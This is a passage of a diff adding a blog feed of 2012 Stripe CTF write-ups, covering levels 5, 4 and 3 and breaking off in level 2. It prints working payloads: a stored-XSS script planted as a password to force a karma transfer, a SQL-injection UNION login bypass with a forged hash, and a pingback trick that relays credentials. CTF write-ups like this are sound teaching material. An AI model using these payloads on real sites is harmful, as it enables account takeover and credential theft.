+    &lt;span class="vg"&gt;$log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Server responded with: &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;body&lt;/span&gt;
+&lt;span class="k"&gt;end&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The server uses :code`params` to recover the informations sent by
+the form. Then it &lt;code&gt;POST&lt;/code&gt; s the username and the password to the
+pingback URL. But :code`params` is the Ruby equivalent of
+:code`$_REQUEST` in PHP, which recovers the informations sent by
+&lt;code&gt;POST&lt;/code&gt;, but also by &lt;code&gt;GET&lt;/code&gt;. So let's say we put this as
+a pingback URL:
+&lt;code&gt;http://leve05-[numbers].stripe-ctf.com?pingback=http://level02-[numbers].stripe-ctf.com&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Okay, here is where it gets tricky: the server retrieves the previous
+URL as a pingback. It then posts our username/password to it, i.e. to
+itself, since the address is
+&lt;code&gt;level05-[numbers].stripe-ctf.com&lt;/code&gt;. So the server finds itself
+with a username/password by &lt;code&gt;POST&lt;/code&gt;, and a pingback (the level
+#2 URL) by &lt;code&gt;GET&lt;/code&gt;. So it does its business: sends the
+username/password to the pingback.&lt;/p&gt;
+&lt;p&gt;First we fill in the login:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level05-second-form.png"&gt;&lt;img alt="level05-second-form" src="/images/level05-second-form.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Then we submit:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level05-second-login.png"&gt;&lt;img alt="level05-second-login" src="/images/level05-second-login.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We clearly see here that the server was interrogated twice.&lt;/p&gt;
+&lt;p&gt;And we just have to go back to the login page:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level05-w00t.png"&gt;&lt;img alt="level05-w00t" src="/images/level05-w00t.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;w00t!&lt;/p&gt;
+</summary></entry><entry><title>Stripe CTF: Level #4</title><link href="https://allyourbase.utouch.fr/stripe-ctf-level-4.html" rel="alternate"></link><updated>2012-10-27T14:22:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-27:stripe-ctf-level-4.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="/images/level04-logo.jpg"&gt;&lt;img alt="level04-logo" src="/images/level04-logo.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You can find the code for this level
+&lt;a class="reference external" href="/docs/stripe-ctf-level04.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;(sha256:
+&lt;code&gt;07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;This level wants you to spread joy over the world. You have a certain
+amount of karma you can distribute to people. But to be sure that you
+only send karma to people you really trust to be good, everyone you send
+karma to will be able to see your password. What's more, the user
+karma_fountain is soooo good that he has infinite karma. Wouldn't it be
+nice if you could get access to his account?&lt;/p&gt;
+&lt;p&gt;Here, we can see that the user captain sent us one karma. Now, his
+password, ''captain_password'', is visible to us.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level04-transfer_captain_cats.png"&gt;&lt;img alt="level04-transfer_captain_cats" src="/images/level04-transfer_captain_cats.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;So, all we have to do to get karma_fountain's password is to get him to
+send us karma. Two ways for this: we could be so good that he'll want to
+give us karma, or we can force him a little bit.&lt;/p&gt;
+&lt;p&gt;So, what are our ways to interact with karma_fountain? The site doesn't
+offer some kind of internal messaging, we don't have an email address...
+All we can do is send karma_fountain some karma. Then, he'll see our
+password on his profile page. Hmmm, our password will be written to its
+profile page:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File views/home.erb, line 52&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;% @registered_users.each &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="sx"&gt;&amp;lt;% last_active = user[:last_active].strftime(&amp;#39;%H:%M:%S UTC&amp;#39;) %&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;% if &lt;/span&gt;&lt;span class="vi"&gt;@trusts_me&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;include?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:username&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="sx"&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;%= user[:username] %&amp;gt;&lt;/span&gt;
+&lt;span class="sx"&gt;(password: &amp;lt;%=&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;, last active &amp;lt;%= last_active %&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/li&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The password is not sanitized before it is displayed. Is it before it's
+registered in the database?&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 168&lt;/span&gt;
+&lt;span class="no"&gt;DB&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:users&lt;/span&gt;&lt;span class="o"&gt;].&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="ss"&gt;:username&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="ss"&gt;:password&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="ss"&gt;:karma&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;STARTING_KARMA&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="ss"&gt;:last_active&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utc&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Nope. So if we put some javascript code as our password, and then we
+send karma to karma_fountain, our password (i.e. the javascript code)
+will be embedded in karma_fountain's page. If this javascript tells
+karma_fountain's browser to send us karma, its password will be
+displayed on our home page.&lt;/p&gt;
+&lt;p&gt;So, let's create a user evil_hacker, with the following password:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;form&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;form&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;method&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;action&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;transfer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;to_field&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;to&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;value&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cats&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;amount_field&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;value&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;submit&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Okay, I know this code is way too long, but javascript is really not my
+strong suit. Plus, there is the problem that once karma_fountain's
+browser executes the javascript, the transfer will take place, then
+karma_fountain will be redirected to its homepage, where the transfer
+will take place etc. Not very sly. So, there is room for improvement on
+this code. It's just to demonstrate the attack.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level04-evil_hacker_register.png"&gt;&lt;img alt="level04-evil_hacker_register" src="/images/level04-evil_hacker_register.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We connect as evil_hacker and send one karma to karma_fountain. Then,
+we wait for him to connect (the CTF staff had put up a bot which would
+look at its profile page every five minutes). Let's look at our profile:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level4-w00t.png"&gt;&lt;img alt="level4-w00t" src="/images/level4-w00t.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;w00t!&lt;/p&gt;
+</summary></entry><entry><title>Stripe CTF: Level #3</title><link href="https://allyourbase.utouch.fr/stripe-ctf-level-3.html" rel="alternate"></link><updated>2012-10-26T23:34:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-26:stripe-ctf-level-3.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="/images/level03-logo.png"&gt;&lt;img alt="level03-logo" src="/images/level03-logo.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You can find the code for this level
+&lt;a class="reference external" href="/docs/level03-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;(sha256:
+&lt;code&gt;8710c082daed1839806addebeda44c6e5496d44a33f7eb3f23a577b6a5fc26d5&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;The company who built the vault of level 0 learned its lesson: you now
+have to identify before accessing your guarded secrets.&lt;/p&gt;
+&lt;p&gt;The company kindly tells you that other users have already chosen to
+use their product, and even what the stored secrets are.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level03-index.png"&gt;&lt;img alt="level03-index" src="/images/level03-index.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Sorry for math and physics fan, but we'll focus on bob's secret.&lt;/p&gt;
+&lt;p&gt;So, let's look at the code used to identify users:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File secretvault.py, line 74&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;login&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Must provide username&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Must provide password&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+
+    &lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlite3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data_dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;users.db&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;cursor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+    &lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&amp;quot;SELECT id, password_hash, salt FROM users&lt;/span&gt;
+&lt;span class="s"&gt;            WHERE username = &amp;#39;{0}&amp;#39; LIMIT 1&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchone&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;There&amp;#39;s no such user {0}!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;
+
+    &lt;span class="n"&gt;calculated_hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;calculated_hash&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;That&amp;#39;s not the password for {0}!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_id&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;redirect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;absolute_url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Wow. Hashed passwords, and even salt! Seems pretty secure. But the
+statements aren't prepared: they are vulnerable to SQL injection. We are
+gonna use a :code`UNION` statement, to force the id, the password's
+hash and the salt to be arbitrary values. We can see from the
+&lt;code&gt;generate_data.py&lt;/code&gt; file that the default users were added in a
+random order, so we don't know what bob's id is. Since there are only
+three values, we can try each by hand. For the sake of simplicity, we'll
+suppose here that bob's id is 1.&lt;/p&gt;
+&lt;p&gt;So, let's say we put this as a user in the form:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;dummy-user' UNION SELECT 1, 'hash', 'salt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The statement will become:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;dummy-user&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;hash&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;salt&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This way, the first part of the statement will yield an empty row, and
+the second part will yield 1, 'hash', 'salt'. If we want to connect with
+the password 'foo', with the salt 'bar', we can compute the password's
+hash:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sha256('foobar') =
+c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We fill the form this way:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;user = dummy-user' UNION SELECT 1,
+'c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2',
+'bar&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;and&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;password = foo&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level03-filled-form.png"&gt;&lt;img alt="level03-filled-form" src="/images/level03-filled-form.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We just have to submit to retrieve bob's secret:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level03-w00t.png"&gt;&lt;img alt="level03-w00t" src="/images/level03-w00t.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;w00t!&lt;/p&gt;
+</summary></entry><entry><title>Stripe CTF: Level #2</title><link href="https://allyourbase.utouch.fr/stripe-ctf-level-2.html" rel="alternate"></link><updated>2012-10-13T16:11:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:stripe-ctf-level-2.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="/images/level02-logo.png"&gt;&lt;img alt="level02-logo" src="/images/level02-logo.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You can find the code for this level
+&lt;a class="reference external" href="/docs/level02-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;(sha256:
+&lt;code&gt;d175b624ed888badd795c5474ae855f711e856cc41c0757059594babe8f23413&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;This level is a whole social network!&lt;/p&gt;
+&lt;p&gt;Okay, it's not, it's just a page with a profile picture. But on the
